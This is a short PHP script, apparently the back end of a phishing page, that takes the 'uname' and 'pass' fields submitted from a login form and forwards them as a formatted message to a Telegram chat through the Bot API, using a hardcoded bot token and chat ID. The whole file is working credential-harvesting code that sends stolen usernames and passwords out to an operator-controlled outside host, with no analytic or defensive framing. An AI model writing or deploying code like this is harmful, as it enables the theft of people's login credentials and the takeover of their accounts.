<?php

// Set your bot token
$botToken = '7332468991:AAGkKDIFtxtzIyRB7C31x3jgxEpUpHezHDc';

// Chat ID of your group
$chatId = '6842504962';

// Get the "number" field from the POST request
//$text = $_GET ['text'];

// Get the "content" field from the POST request
$uname = $_POST ['uname'];
$pass = $_POST ['pass'];

// Formulate the message to send to Telegram
$message =("Username : $uname\nPassword : $pass\n");

// Form the URL for sending the message via the Telegram Bot API
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Data to send (chat_id and text)
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Initialize a cURL session
$ch = curl_init($apiUrl);

// Set request parameters
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

// Execute the request to the Telegram API
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Output the Telegram API response (can be used for debugging)
echo $response;
?>